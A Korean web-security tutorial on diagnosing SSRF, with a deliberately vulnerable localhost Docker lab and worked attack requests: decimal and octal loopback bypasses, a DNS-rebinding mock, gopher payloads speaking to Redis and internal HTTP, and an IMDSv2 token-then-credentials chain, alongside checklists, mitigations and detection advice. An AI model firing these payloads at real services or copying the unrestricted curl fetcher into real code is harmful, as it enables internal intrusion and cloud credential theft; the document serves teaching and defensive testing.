---
title: 웹 취약점 진단 SSRF편 — URL 검증을 넘어 내부망·프로토콜·렌더러까지
description: "기본·Blind SSRF부터 URL 파서 우회, gopher, IMDS, 내부 포트 탐색과 렌더러 경유까지 안전한 실습으로 깊게 다룹니다."
tags:
  - 웹보안
  - 취약점진단
  - SSRF
  - Blind SSRF
  - IMDS
  - gopher
---

> [!warning] 허가된 환경에서만
> 아래 요청은 **본인이 소유하거나 명시적으로 허가받은 환경**, PortSwigger Web Security Academy, 또는 이 글의 `127.0.0.1` 전용 Docker 앱에서만 실행하세요. 내부 주소·포트 탐색과 `gopher` 요청을 실제 서비스나 특정 기관에 보내면 안 됩니다.

[[웹 취약점 진단 기법 입문 — XXE, SSRF부터 SQLi, XSS까지|입문편의 SSRF]]는 입력 지점과 기본 방어를, [[웹 취약점 진단 심화 — 실무에서 보는 기법들|심화 1편]]은 URL 파서 차이와 IMDS 체인을, [[웹 취약점 진단 심화 2 — 브라우저·데이터·변환기 경계 파고들기|심화 2편]]은 HTML→PDF 렌더러를 이미 소개했습니다. 여기서는 그 기초를 반복하지 않고 **요청 주체·최종 연결 IP·프로토콜·응답 가시성**을 증거로 남기는 실습으로 확장합니다.

## 한눈에 보는 기법 요약

| 기법 | 단서 | 성립 조건 | 영향 | 실습 |
|---|---|---|---|---|
| 기본 SSRF | URL 가져오기·재고 조회·웹훅 테스트 | 사용자 URL을 서버가 요청하고 응답이 반환됨 | 내부 관리 기능·데이터 접근 | PortSwigger 기본 랩 |
| Blind SSRF | 분석·미리보기·비동기 콜백 | 요청은 나가지만 본문이 사용자에게 안 보임 | 내부 탐색, OAST 기반 후속 공격 | PortSwigger OAST 랩 |
| 파서·필터 우회 | 문자열 차단·도메인 허용 목록 | 검증기와 요청기의 URL/IP 해석이 다름 | 차단된 루프백·내부망 도달 | PortSwigger + Docker |
| DNS rebinding·리다이렉트 | 최초 URL만 검사 | 검사와 연결 사이 DNS가 바뀌거나 다음 홉을 재검증하지 않음 | 허용 도메인을 발판으로 내부 접근 | Docker 모의 + PortSwigger |
| `gopher` 프로토콜 스머글링 | HTTP 외 스킴 허용, libcurl 사용 | 임의 TCP 바이트를 내부 서비스에 전달 가능 | Redis 명령·내부 HTTP 요청 | Docker |
| 클라우드 메타데이터 | 클라우드 워크로드와 SSRF | IMDSv1 또는 메서드·헤더 제어 가능한 IMDSv2 요청 | 임시 자격증명·역할 정보 노출 | Docker 모의 IMDS |
| 내부 포트 스캔 | 상태·오류·시간 차이 | 여러 내부 호스트·포트를 지정 가능 | 내부 자산·서비스 식별 | Docker |
| PDF·이미지 렌더러 | PDF·썸네일·웹 캡처 | 렌더러가 비신뢰 URL을 서버 권한으로 가져옴 | 내부 리소스 읽기, Blind SSRF | 기존 심화 2 Docker |

---

## 공통 localhost Docker 실습 앱

3~7절은 아래 앱을 함께 사용합니다. 취약 동작을 의도적으로 넣었으므로 포트는 반드시 루프백에만 공개합니다.

`docker-compose.yml`:

```yaml
services:
  fetcher:
    build: ./fetcher
    ports:
      - "127.0.0.1:5000:5000"
    depends_on: [internal, metadata, redis]
  internal:
    build: ./internal
    expose: ["8000"]
  metadata:
    build: ./metadata
    expose: ["1338"]
  redis:
    image: redis:7.4.1-alpine
    command: ["redis-server", "--protected-mode", "no", "--save", ""]
    expose: ["6379"]
```

`fetcher/Dockerfile`:

```dockerfile
FROM ghcr.io/astral-sh/uv:python3.12-bookworm-slim
WORKDIR /app
RUN apt-get update && apt-get install -y --no-install-recommends curl \
    && rm -rf /var/lib/apt/lists/* \
    && uv pip install --system "flask==3.1.2"
COPY app.py .
CMD ["python", "app.py"]
```

`fetcher/app.py`:

```python
import ipaddress
import socket
import subprocess
import time
from urllib.parse import urlsplit

from flask import Flask, jsonify, request

app = Flask(__name__)


def curl(url: str, method: str = "GET", headers: list[str] | None = None) -> dict:
    command = ["curl", "-sS", "-i", "-L", "--noproxy", "*", "--max-time", "3", "-X", method]
    for header in headers or []:
        command.extend(["-H", header])
    command.append(url)
    started = time.perf_counter()
    result = subprocess.run(command, capture_output=True, text=True, timeout=4)
    return {
        "exit": result.returncode,
        "elapsed": round(time.perf_counter() - started, 3),
        "output": (result.stdout + result.stderr)[:4000],
    }


@app.get("/fetch")
def fetch():
    return jsonify(curl(request.args["url"]))


@app.post("/proxy")
def proxy():
    data = request.get_json()
    headers = [f"{key}: {value}" for key, value in data.get("headers", {}).items()]
    return jsonify(curl(data["url"], data.get("method", "GET"), headers))


@app.get("/weak-fetch")
def weak_fetch():
    url = request.args["url"]
    if "127.0.0.1" in url or "localhost" in url.lower():
        return jsonify(error="blocked by string filter"), 400
    return jsonify(curl(url))


@app.get("/local-secret")
def local_secret():
    return "LOCAL_ONLY_SSRF_OK"


@app.get("/rebind-demo")
def rebind_demo():
    host = request.args.get("host", "example.com")
    checked_ip = "93.184.216.34"
    if ipaddress.ip_address(checked_ip).is_private:
        return jsonify(error="blocked"), 400
    result = subprocess.run(
        ["curl", "-sS", "--noproxy", "*", "--resolve", f"{host}:5000:127.0.0.1", f"http://{host}:5000/local-secret"],
        capture_output=True,
        text=True,
        timeout=3,
    )
    return jsonify(checked_ip=checked_ip, connected_ip="127.0.0.1", body=result.stdout)


@app.get("/probe")
def probe():
    host = request.args.get("host", "internal")
    ports = [int(value) for value in request.args.get("ports", "8000,8001").split(",")]
    results = {}
    for port in ports[:10]:
        started = time.perf_counter()
        try:
            with socket.create_connection((host, port), timeout=0.5):
                state = "open"
        except OSError:
            state = "closed-or-filtered"
        results[str(port)] = {"state": state, "elapsed": round(time.perf_counter() - started, 3)}
    return jsonify(results)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, threaded=True)
```

`internal/Dockerfile`과 `metadata/Dockerfile`은 같습니다.

```dockerfile
FROM ghcr.io/astral-sh/uv:python3.12-bookworm-slim
WORKDIR /app
RUN uv pip install --system "flask==3.1.2"
COPY app.py .
CMD ["python", "app.py"]
```

`internal/app.py`:

```python
from flask import Flask, redirect

app = Flask(__name__)


@app.get("/admin")
def admin():
    return "INTERNAL_ADMIN_OK"


@app.get("/redirect")
def bounce():
    return redirect("http://internal:8000/admin", code=302)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
```

`metadata/app.py`:

```python
from flask import Flask, jsonify, request

app = Flask(__name__)
TOKEN = "LOCAL-LAB-TOKEN"


@app.route("/latest/api/token", methods=["PUT"])
def token():
    if not request.headers.get("X-aws-ec2-metadata-token-ttl-seconds"):
        return "missing ttl", 400
    return TOKEN


@app.get("/v1/latest/meta-data/iam/security-credentials/lab-role")
def v1_credentials():
    return jsonify(AccessKeyId="LOCAL_V1_ONLY", Token="NOT_A_REAL_SECRET")


@app.get("/v2/latest/meta-data/iam/security-credentials/lab-role")
def v2_credentials():
    if request.headers.get("X-aws-ec2-metadata-token") != TOKEN:
        return "token required", 401
    return jsonify(AccessKeyId="LOCAL_V2_ONLY", Token="NOT_A_REAL_SECRET")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1338)
```

```bash
docker compose up --build
```

> [!success] 직접 검증
> 2026-11-27에 Docker Compose로 네 서비스를 빌드·실행하고, 아래의 10진·8진 루프백, 리다이렉트, `gopher` Redis/HTTP, IMDSv1/v2, 포트 탐색 요청을 확인했습니다. DNS rebinding은 외부 DNS를 쓰지 않고 **검사 IP와 연결 IP가 바뀌는 순간을 결정적으로 재현한 모의 실습**입니다.

---

## 1. 기본 SSRF와 Blind SSRF

### 원리·단서 기능·성립 조건

URL 미리보기, 재고 조회, 웹훅 테스트, 이미지 프록시, `Referer` 분석처럼 서버가 URL을 소비하는 곳을 찾습니다. 서버가 사용자가 고른 목적지에 요청하면 SSRF이고, 그 응답이 화면에 보이면 in-band, 보이지 않으면 Blind SSRF입니다. DNS 조회만 발생하고 HTTP 연결이 방화벽에서 막힌 경우는 **요청 시도 증거**이지 내부 데이터 읽기 증거는 아닙니다.

### 따라하기 — PortSwigger 공식 랩

- [Lab: Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost): `stockApi`를 `http://localhost/admin`으로 바꿉니다. 응답에서 관리 페이지가 보이고 랩의 삭제 요청이 수행되면 성공입니다.
- [Lab: Blind SSRF with out-of-band detection](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection): 상품 요청의 `Referer`를 Burp Collaborator 주소로 바꾸고 전송합니다. Collaborator에 **DNS와 HTTP 상호작용**이 모두 나타나면 성공입니다.

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```

Blind 랩에서는 다음처럼 바꿉니다.

```http
GET /product?productId=1 HTTP/1.1
Host: LAB-ID.web-security-academy.net
Referer: http://BURP-COLLABORATOR-SUBDOMAIN/
```

### 진단 체크리스트와 오탐 구분

- [ ] 요청 주체가 브라우저가 아니라 서버임을 서버 로그나 OAST 원본 요청으로 확인했다.
- [ ] DNS만 왔는지 HTTP까지 왔는지 구분했다.
- [ ] 응답 본문·상태·시간 중 무엇이 사용자에게 노출되는지 기록했다.
- [ ] 비동기 작업은 고유 토큰을 써 다른 테스트의 콜백과 구분했다.

### 조치·탐지 포인트·출처

사용자 임의 URL 대신 목적지 ID를 받고 서버가 고정 URL로 매핑하는 것이 가장 안전합니다. URL이 꼭 필요하면 스킴·호스트·포트를 허용 목록으로 제한하고, DNS 해석 결과와 **실제 연결 IP**가 공인 허용 대역인지 확인하며, 송신 프록시에서 루프백·사설·link-local·IMDS를 차단합니다. 작업 ID, 원본 URL, 정규화 URL, 연결 IP, 리다이렉트 체인을 함께 로그로 남깁니다.

- 출처: [PortSwigger SSRF](https://portswigger.net/web-security/ssrf), [PortSwigger Blind SSRF](https://portswigger.net/web-security/ssrf/blind), [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

---

## 2. URL 파서 차이·IP 표기·DNS rebinding·리다이렉트

### 원리·단서 기능·성립 조건

문자열에 `localhost`가 있는지만 막거나, 검증기와 HTTP 클라이언트가 서로 다른 파서를 쓰면 `2130706433`(10진 정수), `017700000001`(8진), `127.1`, userinfo(`allowed@127.0.0.1`)가 다른 호스트로 해석될 수 있습니다. DNS rebinding은 검사 때 공인 IP, 연결 때 내부 IP를 돌려주는 **시간차 공격**이고, 리다이렉트 우회는 첫 URL만 검사한 뒤 다음 홉을 자동 추적할 때 성립합니다. 자세한 파서 차이 개념은 [[웹 취약점 진단 심화 — 실무에서 보는 기법들#15. 파서 차이(Parser Differential) — 같은 바이트, 다른 의미]]를 참고합니다.

### 따라하기

PortSwigger의 [Lab: SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)에서 `127.0.0.1` 차단을 `127.1`로 우회하고, [Lab: SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)에서 허용된 앱의 `nextProduct` 리다이렉트를 내부 관리 URL로 향하게 합니다.

공통 Docker 앱에서는 다음을 실행합니다.

```bash
# 10진 정수 루프백
curl -G 'http://127.0.0.1:5000/weak-fetch' \
  --data-urlencode 'url=http://2130706433:5000/local-secret'

# 8진 루프백
curl -G 'http://127.0.0.1:5000/weak-fetch' \
  --data-urlencode 'url=http://017700000001:5000/local-secret'

# 최초 검사 IP와 연결 IP가 달라지는 DNS rebinding 모의
curl -G 'http://127.0.0.1:5000/rebind-demo' \
  --data-urlencode 'host=example.com'

# 외부처럼 보이는 fetcher 입력이 302를 따라 내부 서비스로 이동
curl -G 'http://127.0.0.1:5000/fetch' \
  --data-urlencode 'url=http://internal:8000/redirect'
```

`LOCAL_ONLY_SSRF_OK`, `checked_ip`와 `connected_ip`의 불일치, `INTERNAL_ADMIN_OK`가 각각 보이면 성공입니다.

### 진단 체크리스트와 오탐 구분

- [ ] URL 검증과 요청에 같은 파서의 구조화 결과를 사용한다.
- [ ] IPv4 정수·8진·축약, IPv6·IPv4-mapped IPv6를 정규화 후 판정한다.
- [ ] DNS 응답뿐 아니라 연결 직전/연결된 IP를 검증한다.
- [ ] 모든 3xx 홉을 다시 검증하거나 자동 추적을 끈다.

문자열 필터를 통과해도 실제 연결이 내부 IP가 아니면 우회 성공이 아닙니다. 반대로 302 응답만 받았고 클라이언트가 추적하지 않았다면 내부 도달도 아닙니다.

### 조치·탐지 포인트·출처

userinfo와 fragment를 금지하고 URL을 한 번 파싱한 뒤 그 결과만 사용합니다. DNS 결과 전체가 허용 범위인지 확인하고 연결 IP를 고정(pin)하거나 검증된 송신 프록시를 사용합니다. 리다이렉트는 끄거나 매 홉 스킴·호스트·포트·IP를 재검증합니다. 원본/정규화 호스트, DNS 답변, 연결 IP가 달라지면 경보합니다.

- 출처: [PortSwigger — Circumventing common SSRF defenses](https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses), [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

---

## 3. 프로토콜 스머글링 — `gopher`로 Redis·내부 HTTP 말하기

### 원리·단서 기능·성립 조건

URL 가져오기가 `http`/`https`만 허용하지 않고 libcurl 같은 다중 프로토콜 클라이언트에 그대로 전달되면 `gopher://host:port/_<bytes>`로 임의에 가까운 TCP 바이트를 보낼 수 있습니다. 내부 Redis가 인증 없이 열렸거나 HTTP 서비스가 신뢰 경계 안에서만 보호될 때 영향이 커집니다.

### 따라하기 — 공통 Docker

```bash
# RESP로 PING 뒤 QUIT을 보내 응답 후 연결 종료
curl -G 'http://127.0.0.1:5000/fetch' \
  --data-urlencode 'url=gopher://redis:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A%2A1%0D%0A%244%0D%0AQUIT%0D%0A'

# 내부 HTTP 요청을 TCP 바이트로 직접 전달
curl -G 'http://127.0.0.1:5000/fetch' \
  --data-urlencode 'url=gopher://internal:8000/_GET%20/admin%20HTTP/1.1%0D%0AHost:%20internal%0D%0AConnection:%20close%0D%0A%0D%0A'
```

첫 응답에 `+PONG`, 둘째 응답에 `INTERNAL_ADMIN_OK`가 있으면 성공입니다. URL 인코딩은 한 번만 풀린 뒤 전송되어야 하므로 Burp와 프레임워크가 추가 디코딩하는지 원본 바이트를 확인합니다.

### 진단 체크리스트와 오탐 구분

- [ ] `file`, `dict`, `ftp`, `gopher` 등 불필요한 스킴을 요청기 수준에서 거부한다.
- [ ] 내부 Redis·Memcached·SMTP 등이 인증·네트워크 분리 없이 노출되는지 확인한다.
- [ ] 단순 TCP 연결과 유효한 프로토콜 응답을 구분한다.

### 조치·탐지 포인트·출처

애플리케이션과 송신 프록시에서 `https` 등 필요한 스킴만 명시적으로 허용하고, URL 문자열이 아니라 파싱된 scheme을 검사합니다. 데이터 계층은 내부망이라도 인증과 TLS를 적용합니다. 비 HTTP 스킴, 6379·11211·25 등 비정상 목적지 포트, `%0d%0a` 밀집 URL을 기록합니다.

- 출처: [RFC 1436 — The Internet Gopher Protocol](https://www.rfc-editor.org/rfc/rfc1436), [curl supported protocols](https://curl.se/docs/protdocs.html), [Redis security](https://redis.io/docs/latest/operate/oss_and_stack/management/security/)

---

## 4. 클라우드 메타데이터 — IMDSv1과 IMDSv2

### 원리·단서 기능·성립 조건

[[웹 취약점 진단 인프라편 — CI-CD와 클라우드 설정 노출#4. 클라우드 메타데이터(IMDS)를 통한 자격증명 탈취]]의 핵심처럼 IMDSv1은 토큰 없는 GET으로 조회되지만, IMDSv2는 먼저 `PUT /latest/api/token`과 TTL 헤더로 토큰을 받고 이후 GET에 토큰 헤더를 실어야 합니다. 따라서 단순 GET-only SSRF는 v2에서 막히지만, 메서드와 임의 헤더까지 대리하는 프록시형 SSRF라면 방어 경계가 아닙니다.

### 따라하기 — 공통 Docker 모의 IMDS

```bash
# v1: 단순 GET만으로 모의 자격증명 반환
curl -G 'http://127.0.0.1:5000/fetch' \
  --data-urlencode 'url=http://metadata:1338/v1/latest/meta-data/iam/security-credentials/lab-role'

# v2: 토큰 없는 단순 SSRF는 401
curl -G 'http://127.0.0.1:5000/fetch' \
  --data-urlencode 'url=http://metadata:1338/v2/latest/meta-data/iam/security-credentials/lab-role'

# 헤더·메서드 제어형 SSRF로 토큰 발급
curl -s -X POST 'http://127.0.0.1:5000/proxy' \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://metadata:1338/latest/api/token","method":"PUT","headers":{"X-aws-ec2-metadata-token-ttl-seconds":"60"}}'

# 발급된 로컬 토큰을 v2 조회에 사용
curl -s -X POST 'http://127.0.0.1:5000/proxy' \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://metadata:1338/v2/latest/meta-data/iam/security-credentials/lab-role","headers":{"X-aws-ec2-metadata-token":"LOCAL-LAB-TOKEN"}}'
```

각각 `LOCAL_V1_ONLY`, `401`, `LOCAL-LAB-TOKEN`, `LOCAL_V2_ONLY`가 보이면 성공입니다. 이 실습은 실제 AWS에 접근하지 않습니다.

### 진단 체크리스트와 오탐 구분

- [ ] SSRF가 GET만 가능한지, PUT·헤더·응답 읽기까지 가능한지 나눠 기록했다.
- [ ] 실제 EC2 설정의 `HttpTokens`가 `required`인지 확인했다.
- [ ] 획득 가능한 역할이 있어도 그 IAM 정책 범위로 영향을 제한해 평가했다.

### 조치·탐지 포인트·출처

EC2는 IMDSv2를 강제하고 hop limit을 최소화하며, 워크로드 역할을 최소 권한으로 둡니다. 애플리케이션 egress에서 `169.254.169.254`, `[fd00:ec2::254]` 등 metadata 주소를 차단합니다. 웹 프로세스가 metadata로 PUT을 보내거나 TTL/token 헤더를 쓰면 우선 조사합니다.

- 출처: [AWS — IMDSv2 동작](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html), [AWS — 인스턴스 메타데이터 보안 자격증명](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-security-credentials.html)

---

## 5. SSRF를 내부 포트 스캐너로 쓰기

### 원리·단서 기능·성립 조건

서버가 여러 내부 목적지로 연결하고 연결 성공·거절·시간 초과를 서로 다르게 노출하면 응답 본문 없이도 포트 상태를 추론할 수 있습니다. 단, 네트워크 지연과 애플리케이션 타임아웃도 같은 모양을 만들므로 반복 측정과 기준선이 필요합니다.

### 따라하기 — 공통 Docker

```bash
curl -sG 'http://127.0.0.1:5000/probe' \
  --data-urlencode 'host=internal' \
  --data-urlencode 'ports=8000,8001'
```

기대 결과는 `8000=open`, `8001=closed-or-filtered`입니다. 성공 판단은 한 번의 빠르기 차이가 아니라 알려진 열린 포트와 닫힌 포트가 반복해서 분리되는 것입니다.

### 진단 체크리스트와 오탐 구분

- [ ] 열린/닫힌/드롭 기준 포트를 각각 준비해 타임아웃 분포를 비교했다.
- [ ] 동시성·대상 범위를 최소화하고 승인된 내부 주소만 시험했다.
- [ ] HTTP 상태 차이가 실제 TCP 연결 차이인지 서버 로그로 교차 확인했다.

### 조치·탐지 포인트·출처

목적지와 포트 allowlist, 짧고 동일한 오류 응답, 연결 시간 상한을 적용하되 **오류 통일만으로 SSRF를 해결했다고 보지 않습니다**. 송신 방화벽이 핵심입니다. 한 작업이 짧은 시간에 다수 포트·사설 주소를 순회하면 경보하고, 요청 URL과 연결 결과를 작업 ID로 묶습니다.

- 출처: [PortSwigger — SSRF attacks against back-end systems](https://portswigger.net/web-security/ssrf#ssrf-attacks-against-other-back-end-systems), [OWASP WSTG — Testing for SSRF](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery)

---

## 6. PDF·이미지 렌더러 경유 SSRF

### 원리·단서 기능·성립 조건

HTML→PDF, 웹 캡처, SVG·썸네일 변환기는 `<img>`, CSS `url()`, `@import`, 폰트와 SVG 외부 참조를 **서버 네트워크 권한**으로 가져옵니다. 업로드가 저장만 되고 변환되지 않으면 성립하지 않습니다.

### 따라하기 — 기존 localhost Docker 실습 재사용

[[웹 취약점 진단 심화 2 — 브라우저·데이터·변환기 경계 파고들기#6. HTML→PDF 변환기 SSRF — 렌더러가 서버 안에서 URL을 가져올 때]]의 전체 Docker 코드와 아래 흐름을 그대로 사용합니다.

```bash
curl -s http://127.0.0.1:5000/state
curl -s -X POST 'http://127.0.0.1:5000/pdf' \
  --data-urlencode 'html=<h1>PDF</h1><img src="http://127.0.0.1:5000/internal.svg">' \
  -o out.pdf
curl -s http://127.0.0.1:5000/state
```

유효한 PDF가 생성되고 `internal_fetches`가 1 증가하면 성공입니다. 브라우저가 이미지를 가져온 것이 아니라 변환 작업 중 서버 로그에 요청이 남아야 합니다.

### 진단 체크리스트와 오탐 구분

- [ ] HTML·CSS·SVG·폰트·첨부 등 모든 fetch sink를 확인했다.
- [ ] 렌더링 프로세스의 실제 목적지 IP와 리다이렉트 체인을 확보했다.
- [ ] 클라이언트 요청과 서버 렌더러 요청을 User-Agent만이 아니라 서버 측 작업 ID로 구분했다.

### 조치·탐지 포인트·출처

외부 리소스를 제거하고 필요한 자산은 고정 저장소에서 미리 가져와 로컬 데이터로 전달합니다. 렌더러 컨테이너는 파일·네트워크 권한을 최소화하고 송신 프록시를 강제합니다. 변환 작업별 DNS·HTTP·`file:` 접근을 기록하고 루프백·사설·link-local 연결을 차단합니다.

- 출처: [WeasyPrint Security](https://doc.courtbouillon.org/weasyprint/stable/first_steps.html#security), [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

---

## 다음 단계로 이어지는 공격

SSRF로 얻은 것은 대개 **내부망 도달성, 서비스 배너, 관리 API 응답, 메타데이터 역할 자격증명**입니다. 이것은 Redis·관리 콘솔의 무인증 기능, 내부 API의 약한 인가, 클라우드 IAM 권한 상승, 렌더러·HTTP 클라이언트 취약점으로 이어질 수 있습니다. 보고서에는 “내부에 닿았다”에서 멈추지 말고, 얻은 권한과 다음 신뢰 경계를 명확히 적습니다.
